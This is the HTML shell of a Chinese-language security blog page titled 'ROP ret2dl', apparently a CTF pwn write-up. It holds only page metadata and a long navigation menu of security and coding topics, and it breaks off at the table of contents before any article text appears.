



<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="Windforce17's blog">
      
      
        <link rel="canonical" href="https://windforce17.github.io/blog/ctf/pwn/ROP_ret2dl/">
      
      
        <meta name="author" content="Windforce17">
      
      
        <meta name="lang:clipboard.copy" content="复制">
      
        <meta name="lang:clipboard.copied" content="已复制">
      
        <meta name="lang:search.language" content="zh-CN">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
      
        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
      
        <meta name="lang:search.result.other" content="# 个符合条件的结果">
      
        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
      
      <link rel="shortcut icon" href="../../..">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
    
      
        <title>ROP ret2dl - windforce17's blog</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/application.82a18eb7.css">
      
        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.3e3d1dff.css">
      
      
        
        
        <meta name="theme-color" content="">
      
    
    
      <script src="../../../assets/javascripts/modernizr.74668098.js"></script>
    
    
      
        <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Fira+Sans:300,400,400i,700%7CFira+Mono&display=fallback">
        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../../_static/css/extra.css">
    
    
      
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#_1" tabindex="1" class="md-skip">
        跳转至
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="https://windforce17.github.io/blog/" title="windforce17's blog" class="md-header-nav__button md-logo">
          
            <i class="md-icon">school</i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              windforce17's blog
            </span>
            <span class="md-header-nav__topic">
              
                ROP ret2dl
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            键入以开始搜索
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  

<a href="https://github.com/Windforce17/blog/" title="前往 Github 仓库" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    Windforce17/blog
  </div>
</a>
          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
        

  

<nav class="md-tabs md-tabs--active" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  <li class="md-tabs__item">
    
      <a href="../../.." class="md-tabs__link">
        Home
      </a>
    
  </li>

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../Web&Attack/SQL注入/" class="md-tabs__link">
          Web&Attack
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../coding/command/" class="md-tabs__link">
          Coding
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../CTFstudy/" class="md-tabs__link md-tabs__link--active">
          Ctf
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../gameSecurity/protect/" class="md-tabs__link">
          gameSecurity
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../ics/发现/" class="md-tabs__link">
          Ics
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../keyAndSetting/各种Key/" class="md-tabs__link">
          keyAndSetting
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../reverse/ReversingTools/" class="md-tabs__link">
          Reverse
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../../ustc/101/" class="md-tabs__link">
          Ustc
        </a>
      
    </li>
  

      
    </ul>
  </div>
</nav>
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="https://windforce17.github.io/blog/" title="windforce17's blog" class="md-nav__button md-logo">
      
        <i class="md-icon">school</i>
      
    </a>
    windforce17's blog
  </label>
  
    <div class="md-nav__source">
      


  

<a href="https://github.com/Windforce17/blog/" title="前往 Github 仓库" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    Windforce17/blog
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../../.." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      Web&Attack
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        Web&Attack
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../Web&Attack/SQL注入/" title="SQL注入" class="md-nav__link">
      SQL注入
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../Web&Attack/XSS SSRF/" title="XSS SSRF" class="md-nav__link">
      XSS SSRF
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../Web&Attack/msf/" title="Msf" class="md-nav__link">
      Msf
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../Web&Attack/other/" title="Other" class="md-nav__link">
      Other
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../Web&Attack/wlan/" title="Wlan" class="md-nav__link">
      Wlan
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../Web&Attack/信息收集/" title="信息收集" class="md-nav__link">
      信息收集
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../Web&Attack/压测/" title="压测" class="md-nav__link">
      压测
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../Web&Attack/各种漏洞/" title="各种漏洞" class="md-nav__link">
      各种漏洞
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../Web&Attack/大型互联网企业入侵检测实战总结/" title="大型互联网企业入侵检测实战总结" class="md-nav__link">
      大型互联网企业入侵检测实战总结
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../Web&Attack/提权和后门/" title="提权和后门" class="md-nav__link">
      提权和后门
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../Web&Attack/社工/" title="社工" class="md-nav__link">
      社工
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      Coding
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        Coding
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/command/" title="python" class="md-nav__link">
      python
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/conf/" title="Conf" class="md-nav__link">
      Conf
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/csgo/" title="Csgo" class="md-nav__link">
      Csgo
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/git/" title="Git" class="md-nav__link">
      Git
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/interview/" title="Interview" class="md-nav__link">
      Interview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/java/" title="Java" class="md-nav__link">
      Java
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/jetbrains/" title="Jetbrains" class="md-nav__link">
      Jetbrains
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/php/" title="Php" class="md-nav__link">
      Php
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/uefi&bios/" title="Uefi&bios" class="md-nav__link">
      Uefi&bios
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/vscode/" title="Vscode" class="md-nav__link">
      Vscode
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/参考文献写法/" title="参考文献写法" class="md-nav__link">
      参考文献写法
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-12" type="checkbox" id="nav-3-12">
    
    <label class="md-nav__link" for="nav-3-12">
      Internet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-12">
        Internet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/Internet/网络协议/" title="网络协议" class="md-nav__link">
      网络协议
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-13" type="checkbox" id="nav-3-13">
    
    <label class="md-nav__link" for="nav-3-13">
      C&cpp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-13">
        C&cpp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/c&cpp/Polymorphism/" title="Polymorphism" class="md-nav__link">
      Polymorphism
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/c&cpp/asm/" title="Asm" class="md-nav__link">
      Asm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/c&cpp/c++/" title="C++" class="md-nav__link">
      C++
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/c&cpp/cmake/" title="Cmake" class="md-nav__link">
      Cmake
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/c&cpp/ldd/" title="linux 设备驱动第三版" class="md-nav__link">
      linux 设备驱动第三版
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/c&cpp/lib/" title="Lib" class="md-nav__link">
      Lib
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/c&cpp/pointer/" title="Pointer" class="md-nav__link">
      Pointer
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/c&cpp/qt/" title="Qt 静态编译" class="md-nav__link">
      Qt 静态编译
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/c&cpp/winapi/" title="Winapi" class="md-nav__link">
      Winapi
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-14" type="checkbox" id="nav-3-14">
    
    <label class="md-nav__link" for="nav-3-14">
      dataBase
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-14">
        dataBase
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/dataBase/mysql/" title="Mysql" class="md-nav__link">
      Mysql
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/dataBase/坑/" title="坑" class="md-nav__link">
      坑
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-15" type="checkbox" id="nav-3-15">
    
    <label class="md-nav__link" for="nav-3-15">
      Golang
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-15">
        Golang
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/golang/Golang 20 Tips/" title="Golang tips and traps" class="md-nav__link">
      Golang tips and traps
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/golang/gin/" title="Gin" class="md-nav__link">
      Gin
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/golang/go/" title="Go" class="md-nav__link">
      Go
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/golang/problem/" title="Problem" class="md-nav__link">
      Problem
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/golang/rsa/" title="Rsa" class="md-nav__link">
      Rsa
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/golang/vgo/" title="Vgo" class="md-nav__link">
      Vgo
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-16" type="checkbox" id="nav-3-16">
    
    <label class="md-nav__link" for="nav-3-16">
      Linux
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-16">
        Linux
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/linux/CentOS7/" title="CentOS7" class="md-nav__link">
      CentOS7
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/linux/arch/" title="Arch" class="md-nav__link">
      Arch
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/linux/etcd/" title="Etcd" class="md-nav__link">
      Etcd
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/linux/nginx/" title="Nginx" class="md-nav__link">
      Nginx
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/linux/ptrace/" title="Ptrace" class="md-nav__link">
      Ptrace
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/linux/ubuntu18/" title="Ubuntu18" class="md-nav__link">
      Ubuntu18
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-16-7" type="checkbox" id="nav-3-16-7">
    
    <label class="md-nav__link" for="nav-3-16-7">
      Devops
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-3-16-7">
        Devops
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/linux/devops/docker/" title="Docker" class="md-nav__link">
      Docker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/linux/devops/gitlab&ci/" title="Gitlab&ci" class="md-nav__link">
      Gitlab&ci
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/linux/devops/https&ssl/" title="使用Let's Encrypt 进行泛解析。" class="md-nav__link">
      使用Let's Encrypt 进行泛解析。
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/linux/devops/improve_performance/" title="性能优化" class="md-nav__link">
      性能优化
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/linux/devops/iptables/" title="Iptables" class="md-nav__link">
      Iptables
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/linux/devops/linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/linux/devops/op&docker service/" title="Op&docker service" class="md-nav__link">
      Op&docker service
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-17" type="checkbox" id="nav-3-17">
    
    <label class="md-nav__link" for="nav-3-17">
      macOS
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-17">
        macOS
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/macOS/app/" title="App" class="md-nav__link">
      App
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/macOS/gdb无法调试问题/" title="Gdb无法调试问题" class="md-nav__link">
      Gdb无法调试问题
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-18" type="checkbox" id="nav-3-18">
    
    <label class="md-nav__link" for="nav-3-18">
      Python
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-18">
        Python
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/python/DjangoStudy/" title="Django学习" class="md-nav__link">
      Django学习
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/python/math/" title="Math" class="md-nav__link">
      Math
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/python/python/" title="Python" class="md-nav__link">
      Python
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-19" type="checkbox" id="nav-3-19">
    
    <label class="md-nav__link" for="nav-3-19">
      Win
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-19">
        Win
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/win/win ctl/" title="Win ctl" class="md-nav__link">
      Win ctl
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-20" type="checkbox" id="nav-3-20">
    
    <label class="md-nav__link" for="nav-3-20">
      前端♂js
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-20">
        前端♂js
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/前端♂js/ThreeJS/" title="ThreeJS" class="md-nav__link">
      ThreeJS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/前端♂js/WDS can't connet/" title="WDS can't connet" class="md-nav__link">
      WDS can't connet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/前端♂js/css/" title="Css" class="md-nav__link">
      Css
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/前端♂js/js/" title="Js" class="md-nav__link">
      Js
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/前端♂js/npm&webpack/" title="Npm&webpack" class="md-nav__link">
      Npm&webpack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/前端♂js/vue/" title="Vue" class="md-nav__link">
      Vue
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/前端♂js/vuetify/" title="Vuetify" class="md-nav__link">
      Vuetify
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-21" type="checkbox" id="nav-3-21">
    
    <label class="md-nav__link" for="nav-3-21">
      编译原理
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-21">
        编译原理
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../coding/编译原理/overView/" title="概述" class="md-nav__link">
      概述
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4" checked>
    
    <label class="md-nav__link" for="nav-4">
      Ctf
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        Ctf
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../CTFstudy/" title="CTFstudy" class="md-nav__link">
      CTFstudy
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../取证/" title="取证" class="md-nav__link">
      取证
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../恶意软件分析/" title="恶意软件分析" class="md-nav__link">
      恶意软件分析
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../爆破相关/" title="爆破相关" class="md-nav__link">
      爆破相关
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-5" type="checkbox" id="nav-4-5">
    
    <label class="md-nav__link" for="nav-4-5">
      Awd
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-4-5">
        Awd
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../awd/AWD/" title="AWD" class="md-nav__link">
      AWD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../awd/权限维持/" title="权限维持" class="md-nav__link">
      权限维持
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-5-3" type="checkbox" id="nav-4-5-3">
    
    <label class="md-nav__link" for="nav-4-5-3">
      Muma
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-4-5-3">
        Muma
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../awd/muma/getshell/" title="Getshell" class="md-nav__link">
      Getshell
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-6" type="checkbox" id="nav-4-6">
    
    <label class="md-nav__link" for="nav-4-6">
      Crypto
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-4-6">
        Crypto
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/decrypt_online/" title="Decrypt online" class="md-nav__link">
      Decrypt online
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/go_crack/" title="Go crack" class="md-nav__link">
      Go crack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/md5padding/" title="Md5padding" class="md-nav__link">
      Md5padding
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../crypto/rsa待填/" title="Rsa待填" class="md-nav__link">
      Rsa待填
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-7" type="checkbox" id="nav-4-7">
    
    <label class="md-nav__link" for="nav-4-7">
      Misc
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-4-7">
        Misc
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/dropsec12.9/" title="misc" class="md-nav__link">
      misc
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/hash/" title="Hash" class="md-nav__link">
      Hash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/misc/" title="Misc" class="md-nav__link">
      Misc
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/wireshark/" title="Wireshark" class="md-nav__link">
      Wireshark
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../misc/内存取证/" title="内存取证" class="md-nav__link">
      内存取证
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4-8" type="checkbox" id="nav-4-8" checked>
    
    <label class="md-nav__link" for="nav-4-8">
      Pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-4-8">
        Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../ROP/" title="ROP" class="md-nav__link">
      ROP
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        ROP ret2dl
      </label>
    
    <a href="./" title="ROP ret2dl" class="md-nav__link md-nav__link--active">
      ROP ret2dl
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    准备
  </a>
  
</li>
      
